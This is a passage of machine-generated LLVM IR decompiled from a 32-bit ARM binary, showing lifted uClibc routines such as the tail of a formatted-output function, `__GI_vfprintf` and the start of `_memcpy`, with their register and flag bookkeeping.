  br i1 %v2_16fc4, label %dec_label_pc_16fcc, label %dec_label_pc_16f94

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fc4
  %v1_16fcc = add i32 %v5_16fac, -2
  store i32 %v1_16fcc, i32* %r3.global-to-local, align 4
  %v0_16fd0 = load i32, i32* %sl.global-to-local, align 4
  %v1_16fd0 = trunc i32 %v0_16fd0 to i8
  %v4_16fd0 = inttoptr i32 %v1_16fcc to i8*
  store i8 %v1_16fd0, i8* %v4_16fd0, align 1
  %v0_16fd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_16fd4 = add i32 %v0_16fd4, -1
  store i32 %v1_16fd4, i32* %r2.global-to-local, align 4
  %v0_16fd8 = load i32, i32* %r8.global-to-local, align 4
  %v1_16fd8 = trunc i32 %v0_16fd8 to i8
  %v4_16fd8 = inttoptr i32 %v1_16fd4 to i8*
  store i8 %v1_16fd8, i8* %v4_16fd8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_16fe0 = load i32, i32* %r6.global-to-local, align 4
  %v1_16fe0 = inttoptr i32 %v0_16fe0 to i32*
  store i32 112, i32* %v1_16fe0, align 4
  %v3_16fe0 = add i32 %v0_16fe0, 4
  %v4_16fe0 = inttoptr i32 %v3_16fe0 to i32*
  %v5_16fe0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_16fe0, i32* %v4_16fe0, align 4
  %v0_16fe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16fe4 = load i32, i32* %r6.global-to-local, align 4
  %v2_16fe4 = add i32 %v1_16fe4, 8
  %v3_16fe4 = inttoptr i32 %v2_16fe4 to i32*
  store i32 %v0_16fe4, i32* %v3_16fe4, align 4
  %v0_16fe8 = load i32, i32* %r6.global-to-local, align 4
  %v1_16fe8 = add i32 %v0_16fe8, 12
  store i32 %v1_16fe8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16fec

dec_label_pc_16fec:                               ; preds = %dec_label_pc_16f64, %.thread127, %dec_label_pc_16fcc
  %v1_16ff8.pre = phi i32 [ %v2_16aa4, %.thread127 ], [ %v1_16fe8, %dec_label_pc_16fcc ], [ %v1_16ff8.pre.pre, %dec_label_pc_16f64 ]
  %v2_16fec = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_16fec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16ff0

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16ff0, %dec_label_pc_16fec
  %v0_16ff0 = phi i32 [ %v2_16fec, %dec_label_pc_16fec ], [ %v4_16ff0, %dec_label_pc_16ff0 ]
  %stack_var_-188.0 = phi i32 [ %v3_16954, %dec_label_pc_16fec ], [ %v2_16ffc, %dec_label_pc_16ff0 ]
  %v1_16ff0 = inttoptr i32 %v0_16ff0 to i32*
  %v2_16ff0 = load i32, i32* %v1_16ff0, align 4
  store i32 %v2_16ff0, i32* %r3.global-to-local, align 4
  %v4_16ff0 = add i32 %v0_16ff0, 12
  store i32 %v4_16ff0, i32* %r2.global-to-local, align 4
  %v3_16ff8 = icmp ult i32 %v4_16ff0, %v1_16ff8.pre
  %v2_16ffc = sub i32 %stack_var_-188.0, %v2_16ff0
  store i32 %v2_16ffc, i32* %r0.global-to-local, align 4
  br i1 %v3_16ff8, label %dec_label_pc_16ff0, label %dec_label_pc_17008

dec_label_pc_17008:                               ; preds = %dec_label_pc_16ff0
  %v3_17008 = load i8, i8* %stack_var_-42, align 1
  %v4_17008 = sext i8 %v3_17008 to i32
  store i32 %v4_17008, i32* %r3.global-to-local, align 4
  store i32 %v4_17008, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1700c = icmp slt i8 %v3_17008, 0
  store i1 %v1_1700c, i1* %cpsr_n.global-to-local, align 1
  %v2_1700c = icmp eq i8 %v3_17008, 0
  store i1 %v2_1700c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1700c, label %bb270, label %bb269

bb269:                                            ; preds = %dec_label_pc_17008
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb270

bb270:                                            ; preds = %dec_label_pc_17008, %bb269
  %v1_17060 = phi i32 [ %v4_17008, %dec_label_pc_17008 ], [ 1, %bb269 ]
  %v2_17014 = sub i32 %v2_16ffc, %v1_17060
  store i32 %v2_17014, i32* %r1.global-to-local, align 4
  %v2_17018 = ptrtoint i8* %stack_var_-42 to i32
  store i32 %v2_17018, i32* %r3.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17020 = icmp slt i32 %v2_17014, 0
  store i1 %v1_17020, i1* %cpsr_n.global-to-local, align 1
  %v2_17020 = icmp eq i32 %v2_17014, 0
  store i1 %v2_17020, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-176, align 4
  %tmp271 = icmp slt i32 %v2_17014, 1
  br i1 %tmp271, label %dec_label_pc_17088, label %dec_label_pc_17034

dec_label_pc_17034:                               ; preds = %bb270
  %v2_17034 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_17034, i32* %ip.global-to-local, align 4
  %v1_17038 = add i32 %v2_17034, 12
  %v2_17038 = inttoptr i32 %v1_17038 to i32*
  %v3_17038 = load i32, i32* %v2_17038, align 4
  store i32 %v3_17038, i32* %r3.global-to-local, align 4
  %v1_1703c = and i32 %v3_17038, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1703c = icmp eq i32 %v1_1703c, 0
  store i1 %v2_1703c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1703c, label %dec_label_pc_17054, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %dec_label_pc_17034
  store i32 ptrtoint (i32* @global_var_20eb7.1260 to i32), i32* %r3.global-to-local, align 4
  %v1_17048 = add i32 %v1_16ff8.pre, 12
  store i32 %v1_17048, i32* %r5.global-to-local, align 4
  %v1_1704c = inttoptr i32 %v1_16ff8.pre to i32*
  store i32 160, i32* %v1_1704c, align 4
  %v3_1704c = add i32 %v1_16ff8.pre, 4
  %v4_1704c = inttoptr i32 %v3_1704c to i32*
  %v5_1704c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1704c, i32* %v4_1704c, align 4
  %v6_1704c = add i32 %v1_16ff8.pre, 8
  %v7_1704c = inttoptr i32 %v6_1704c to i32*
  %v8_1704c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1704c, i32* %v7_1704c, align 4
  br label %dec_label_pc_1708c

dec_label_pc_17054:                               ; preds = %dec_label_pc_17034
  store i32 %v2_17034, i32* %r0.global-to-local, align 4
  %v1_17058 = add i32 %v2_17034, 16
  %v2_17058 = inttoptr i32 %v1_17058 to i32*
  %v3_17058 = load i32, i32* %v2_17058, align 4
  store i32 %v3_17058, i32* %r3.global-to-local, align 4
  %v1_1705c = add i32 %v3_17058, -48
  %v3_1705c = sub i32 47, %v3_17058
  %v4_1705c = and i32 %v3_1705c, %v3_17058
  %v5_1705c = icmp slt i32 %v4_1705c, 0
  store i1 %v5_1705c, i1* %cpsr_v.global-to-local, align 1
  %v6_1705c = icmp slt i32 %v1_1705c, 0
  store i1 %v6_1705c, i1* %cpsr_n.global-to-local, align 1
  %v7_1705c = icmp eq i32 %v3_17058, 48
  store i1 %v7_1705c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1705c, label %dec_label_pc_1706c, label %bb272

bb272:                                            ; preds = %dec_label_pc_17054
  store i32 %v2_16ffc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17088

dec_label_pc_1706c:                               ; preds = %dec_label_pc_17054
  %v3_1706c = load i32, i32* %stack_var_-160, align 4
  store i32 %v1_16ff8.pre, i32* %r5.global-to-local, align 4
  %v2_17074 = add i32 %v3_1706c, %v2_17014
  store i32 %v2_17074, i32* %r3.global-to-local, align 4
  store i32 %v2_17074, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1708c

dec_label_pc_17080:                               ; preds = %dec_label_pc_17094
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_170c4

dec_label_pc_17088:                               ; preds = %bb272, %bb270
  store i32 %v1_16ff8.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1708c

dec_label_pc_1708c:                               ; preds = %dec_label_pc_1706c, %dec_label_pc_17044, %dec_label_pc_17088
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_17090 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_17090, i32* %r4.global-to-local, align 4
  %v3_1709c.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_17094

dec_label_pc_17094:                               ; preds = %dec_label_pc_170bc, %dec_label_pc_1708c
  %v0_17094 = phi i32 [ %v1_170b4, %dec_label_pc_170bc ], [ %v2_17090, %dec_label_pc_1708c ]
  %v1_17094 = inttoptr i32 %v0_17094 to i32*
  %v2_17094 = load i32, i32* %v1_17094, align 4
  store i32 %v2_17094, i32* %r1.global-to-local, align 4
  %v3_17094 = add i32 %v0_17094, 4
  %v4_17094 = inttoptr i32 %v3_17094 to i32*
  %v5_17094 = load i32, i32* %v4_17094, align 4
  store i32 %v5_17094, i32* %r2.global-to-local, align 4
  %v6_17094 = add i32 %v0_17094, 8
  %v7_17094 = inttoptr i32 %v6_17094 to i32*
  %v8_17094 = load i32, i32* %v7_17094, align 4
  store i32 %v8_17094, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v3_1709c.pre, i32* %ip.global-to-local, align 4
  store i32 94376, i32* %lr.global-to-local, align 4
  %v1_170a4 = call i32 @unknown_0()
  store i32 %v1_170a4, i32* %r0.global-to-local, align 4
  %v0_170a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_170a8 = add i32 %v0_170a8, 4
  %v2_170a8 = inttoptr i32 %v1_170a8 to i32*
  %v3_170a8 = load i32, i32* %v2_170a8, align 4
  store i32 %v3_170a8, i32* %r3.global-to-local, align 4
  %v2_170ac = sub i32 %v1_170a4, %v3_170a8
  %v4_170ac = xor i32 %v3_170a8, %v1_170a4
  %v5_170ac = xor i32 %v2_170ac, %v1_170a4
  %v6_170ac = and i32 %v5_170ac, %v4_170ac
  %v7_170ac = icmp slt i32 %v6_170ac, 0
  store i1 %v7_170ac, i1* %cpsr_v.global-to-local, align 1
  %v8_170ac = icmp slt i32 %v2_170ac, 0
  store i1 %v8_170ac, i1* %cpsr_n.global-to-local, align 1
  %v9_170ac = icmp eq i32 %v1_170a4, %v3_170a8
  store i1 %v9_170ac, i1* %cpsr_z.global-to-local, align 1
  %v0_170b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_170b0 = add i32 %v0_170b0, %v1_170a4
  store i32 %v2_170b0, i32* %r6.global-to-local, align 4
  %v1_170b4 = add i32 %v0_170a8, 12
  store i32 %v1_170b4, i32* %r4.global-to-local, align 4
  br i1 %v9_170ac, label %dec_label_pc_170bc, label %dec_label_pc_17080

dec_label_pc_170bc:                               ; preds = %dec_label_pc_17094
  %v1_170bc = load i32, i32* %r5.global-to-local, align 4
  %v2_170bc = sub i32 %v1_170b4, %v1_170bc
  %v3_170bc = icmp ult i32 %v1_170b4, %v1_170bc
  %v4_170bc = xor i32 %v1_170bc, %v1_170b4
  %v5_170bc = xor i32 %v2_170bc, %v1_170b4
  %v6_170bc = and i32 %v5_170bc, %v4_170bc
  %v7_170bc = icmp slt i32 %v6_170bc, 0
  store i1 %v7_170bc, i1* %cpsr_v.global-to-local, align 1
  %v8_170bc = icmp slt i32 %v2_170bc, 0
  store i1 %v8_170bc, i1* %cpsr_n.global-to-local, align 1
  %v9_170bc = icmp eq i32 %v1_170b4, %v1_170bc
  store i1 %v9_170bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_170bc, label %dec_label_pc_17094, label %dec_label_pc_170c4

dec_label_pc_170c4:                               ; preds = %dec_label_pc_170bc, %dec_label_pc_17080
  %v0_170c4 = phi i32 [ -1, %dec_label_pc_17080 ], [ %v2_170b0, %dec_label_pc_170bc ]
  store i32 %v0_170c4, i32* %r0.global-to-local, align 4
  %v2_170cc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_170cc, i32* %r4.global-to-local, align 4
  ret i32 %v0_170c4

; uselistorder directives
  uselistorder i32 %v0_170c4, { 1, 0 }
  uselistorder i32 %v2_170bc, { 1, 0 }
  uselistorder i32 %v1_170bc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_170b4, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_170ac, { 1, 0 }
  uselistorder i32 %v3_170a8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_170a4, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 %v0_17094, { 2, 1, 0 }
  uselistorder i32 %v3_17058, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_17034, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16ffc, { 0, 1, 3, 2 }
  uselistorder i32 %v4_16ff0, { 1, 2, 0 }
  uselistorder i32 %v0_16ff0, { 1, 0 }
  uselistorder i32 %v1_16ff8.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_16fb0, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_16fac, { 2, 1, 0 }
  uselistorder i32 %storemerge180, { 1, 0 }
  uselistorder i32 %v0_16f70, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16f64, { 3, 0, 1, 2 }
  uselistorder i32 %v2_16f40, { 1, 0 }
  uselistorder i32 %v2_16f38, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_16f30, { 1, 0 }
  uselistorder i32 %v0_16f28, { 3, 0, 1, 2 }
  uselistorder i32 %v0_16f10, { 1, 0 }
  uselistorder i32 %v1_16eec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16eec, { 1, 0, 2 }
  uselistorder i32 %v0_16ec4, { 3, 0, 1, 2 }
  uselistorder i1 %v2_16ea4, { 2, 1, 0 }
  uselistorder i32 %v2_16e30, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_16e20, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v1_16f48, { 2, 6, 0, 7, 5, 1, 3, 4, 8 }
  uselistorder i32 %v0_16e8c, { 3, 0, 5, 4, 6, 7, 9, 1, 2, 8 }
  uselistorder i32 %v0_16dcc, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_16db0, { 1, 0 }
  uselistorder i32 %v1_16da8, { 1, 2, 0 }
  uselistorder i32 %v2_16d9c, { 1, 0 }
  uselistorder i32 %v1_16d9c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16d9c, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i32 %v1_16d94, { 1, 0, 2 }
  uselistorder i32 %v0_16d8c, { 3, 0, 1, 2 }
  uselistorder i1 %v3_16d6c, { 1, 0 }
  uselistorder i32 %v2_16d6c, { 1, 0 }
  uselistorder i32 %v2_16d68, { 3, 2, 1, 4, 5, 7, 0, 8, 6, 9 }
  uselistorder i1 %v7_16d54, { 1, 0 }
  uselistorder i32 %v1_16d58, { 2, 1, 0 }
  uselistorder i1 %v2_16d48, { 1, 0 }
  uselistorder i32 %v0_16d44, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_16d2c, { 1, 0 }
  uselistorder i32 %stack_var_-192.7, { 1, 0, 2 }
  uselistorder i32 %v1_16d20, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_16cd8, { 1, 2, 0 }
  uselistorder i32 %v2_16cd4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16cbc, { 1, 3, 5, 6, 0, 4, 2 }
  uselistorder i1 %v2_16cb4, { 1, 0 }
  uselistorder i32 %v0_16cc0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_16c9c, { 1, 0 }
  uselistorder i32 %v0_16c88, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i32 %v0_16c7c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16c70, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_16c6c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16c24, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-192.6, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16b74, { 1, 0 }
  uselistorder i32 %v11_16b50, { 1, 2, 0 }
  uselistorder double %v9_16b50, { 1, 2, 0, 3 }
  uselistorder i32 %v3_16afc, { 1, 0 }
  uselistorder i32 %v1_16ae8, { 3, 2, 0, 1 }
  uselistorder i32 %v0_16b48, { 1, 0 }
  uselistorder i32 %v5_16a94, { 1, 0 }
  uselistorder i32 %v0_16a80, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_169a0.v1_169b48, { 1, 0 }
  uselistorder i1 %not.v7_169a8, { 1, 0 }
  uselistorder i1 %v7_169a8, { 1, 2, 0 }
  uselistorder i32 %v1_16cb8, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32 %v1_16914, { 1, 0 }
  uselistorder i32* %stack_var_-79, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-78, { 1, 2, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-43, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-42, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 5, 6, 10, 7, 2, 8, 9, 3, 11 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 10, 4, 5, 11, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 26, 25, 46, 28, 29, 33, 30, 31, 32, 34, 27, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 57, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 1, 64, 65, 66, 67, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 16, 17, 13, 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 10, 11, 12, 7, 8, 9, 13, 14, 15, 17, 16, 18, 19, 20, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 10, 2, 11, 12, 13, 14, 3, 15, 16, 24, 27, 26, 25, 17, 18, 23, 19, 20, 8, 28, 21, 22, 1, 29, 30, 7, 6, 5, 4, 36, 31, 32, 9, 35, 37, 38, 33, 34, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 14, 12, 13, 15, 16, 0, 17, 18, 19, 20, 21 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 55, 26, 27, 28, 29, 30, 54, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 52, 17, 18, 19, 20, 21, 22, 23, 24, 25, 53, 26, 27, 28, 29, 51, 30, 31, 32, 33, 34, 35, 36, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 56, 18, 19, 20, 21, 22, 23, 24, 25, 26, 55, 27, 28, 29, 30, 54, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 5, 0, 6, 3, 1, 7, 4 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 17, { 18, 0, 9, 10, 1, 11, 12, 2, 13, 3, 14, 4, 15, 5, 16, 20, 19, 6, 7, 8, 17 }
  uselistorder i32 102, { 4, 0, 1, 5, 6, 2, 7, 3 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000020EB7) to float) to i32), { 1, 0 }
  uselistorder i32 520, { 1, 0 }
  uselistorder i32 96, { 2, 3, 0, 1 }
  uselistorder double 0.000000e+00, { 1, 3, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 5, 4, 3, 2, 7, 6, 8, 9, 10 }
  uselistorder i32 %arg3, { 0, 2, 1, 5, 4, 3, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder double %arg2, { 0, 1, 5, 6, 3, 4, 2, 7 }
  uselistorder label %dec_label_pc_1708c, { 2, 0, 1 }
  uselistorder label %bb270, { 1, 0 }
  uselistorder label %dec_label_pc_16fec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16f38, { 1, 0 }
  uselistorder label %.thread49, { 1, 0 }
  uselistorder label %dec_label_pc_16f10, { 1, 0 }
  uselistorder label %dec_label_pc_16eec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e98, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16df4, { 1, 0 }
  uselistorder label %bb257, { 1, 0 }
  uselistorder label %dec_label_pc_16de4, { 1, 0 }
  uselistorder label %dec_label_pc_16dd8, { 1, 0 }
  uselistorder label %bb251, { 1, 0 }
  uselistorder label %bb249, { 1, 0 }
  uselistorder label %bb247, { 1, 0 }
  uselistorder label %.thread162, { 1, 0 }
  uselistorder label %bb243, { 1, 0 }
  uselistorder label %bb241, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb238, { 1, 0 }
  uselistorder label %dec_label_pc_16cf8, { 2, 1, 0 }
  uselistorder label %bb235, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16c20, { 1, 0 }
  uselistorder label %dec_label_pc_16be0, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_16a70, { 1, 0 }
  uselistorder label %dec_label_pc_1698c, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @"$d.2"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_170d0:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = sext i16 %arg1 to i32
  %v0_170e4 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_170e4, label %bb, label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_170d0
  %v0_170f0.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_170f0.pr, label %bb8, label %.thread2

bb:                                               ; preds = %dec_label_pc_170d0
  %v1_170e8 = load i32, i32* @r4, align 4
  %v3_170e8 = xor i32 %v1_170e8, %tmp
  %v2_170ec = sub i32 -1, %v3_170e8
  %v4_170ec = icmp eq i32 %v3_170e8, -1
  %extract.t = trunc i32 %v2_170ec to i16
  br i1 %v4_170ec, label %bb8, label %.thread2

bb8:                                              ; preds = %thread-pre-split, %bb
  %v1_170f0.off0 = phi i16 [ %extract.t, %bb ], [ %arg1, %thread-pre-split ]
  %v4_170f0 = inttoptr i32 %arg2 to i16*
  store i16 %v1_170f0.off0, i16* %v4_170f0, align 2
  %v5_170f0 = load i32, i32* @r7, align 4
  %v6_170f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_170f0 = sub i32 %v6_170f0, %v5_170f0
  store i32 %v7_170f0, i32* %r2.global-to-local, align 4
  %v2_170f4 = load i32, i32* @r4, align 4
  %v5_170f4 = sdiv i32 %v2_170f4, 536870912
  %v6_170f4 = and i32 %v5_170f4, %v7_170f0
  br label %.thread2

.thread2:                                         ; preds = %bb, %thread-pre-split, %bb8
  %v7_170f4 = phi i32 [ %v2_170ec, %bb ], [ %tmp, %thread-pre-split ], [ %v6_170f4, %bb8 ]
  ret i32 %v7_170f4

; uselistorder directives
  uselistorder i32 %v2_170ec, { 1, 0 }
  uselistorder i32 %v3_170e8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_170fc = load i32, i32* @r0, align 4
  %v1_170fc = add i32 %v0_170fc, 52
  %v2_170fc = inttoptr i32 %v1_170fc to i32*
  %v3_170fc = load i32, i32* %v2_170fc, align 4
  store i32 %v3_170fc, i32* @r8, align 4
  %v1_17100 = add i32 %v0_170fc, 56
  store i32 %v1_17100, i32* @r5, align 4
  %v2_17104 = ptrtoint i32* %stack_var_-40 to i32
  %v2_17108 = icmp eq i32 %v3_170fc, 0
  store i32 %v0_170fc, i32* @r4, align 4
  %v0_17110 = load i32, i32* @r1, align 4
  store i32 %v0_17110, i32* @r7, align 4
  %v0_17114 = load i32, i32* @r2, align 4
  store i32 %v0_17114, i32* @r6, align 4
  store i32 %v2_17104, i32* @r0, align 4
  br i1 %v2_17108, label %dec_label_pc_17128, label %dec_label_pc_17144

dec_label_pc_17128:                               ; preds = %entry
  %v1_17130 = call i32 @__pthread_return_void()
  store i32 94532, i32* @lr, align 4
  %v1_17140 = call i32 @__pthread_return_0()
  %v0_17144.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %entry, %dec_label_pc_17128
  %v0_17154 = phi i32 [ %v0_170fc, %entry ], [ %v0_17144.pre, %dec_label_pc_17128 ]
  %v1_17144 = inttoptr i32 %v0_17154 to i8*
  %v2_17144 = load i8, i8* %v1_17144, align 1
  %v2_1714c = icmp ugt i8 %v2_17144, -65
  br i1 %v2_1714c, label %dec_label_pc_1716c, label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %dec_label_pc_17144
  %v3_1715c = call i32 @__stdio_trans2w_o(i8* %v1_17144, i32 128)
  %v2_17160 = icmp eq i32 %v3_1715c, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_17160, label %dec_label_pc_1715c.dec_label_pc_1716c_crit_edge, label %dec_label_pc_17180

dec_label_pc_1715c.dec_label_pc_1716c_crit_edge:  ; preds = %dec_label_pc_1715c
  %v0_17174.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1716c

dec_label_pc_1716c:                               ; preds = %dec_label_pc_1715c.dec_label_pc_1716c_crit_edge, %dec_label_pc_17144
  %v0_17174 = phi i32 [ %v0_17174.pre, %dec_label_pc_1715c.dec_label_pc_1716c_crit_edge ], [ %v0_17154, %dec_label_pc_17144 ]
  %v0_1716c = load i32, i32* @r7, align 4
  %v0_17170 = load i32, i32* @r6, align 4
  %v3_17178 = inttoptr i32 %v0_1716c to i8*
  %v4_17178 = call i32 @_vfprintf_internal(i32 %v0_17174, i8* %v3_17178, i32 %v0_17170)
  store i32 %v4_17178, i32* @r5, align 4
  br label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_1715c, %dec_label_pc_1716c
  %v0_171985 = phi i32 [ -1, %dec_label_pc_1715c ], [ %v4_17178, %dec_label_pc_1716c ]
  %v0_17180 = load i32, i32* @r8, align 4
  %v2_17180 = icmp eq i32 %v0_17180, 0
  br i1 %v2_17180, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17180
  call void @__pseudo_branch(i32 89400)
  %v0_17198.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17180, %bb
  %v0_17198 = phi i32 [ %v0_171985, %dec_label_pc_17180 ], [ %v0_17198.pre, %bb ]
  ret i32 %v0_17198

; uselistorder directives
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__stdio_trans2w_o, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_17180, { 1, 0 }
  uselistorder label %dec_label_pc_17144, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
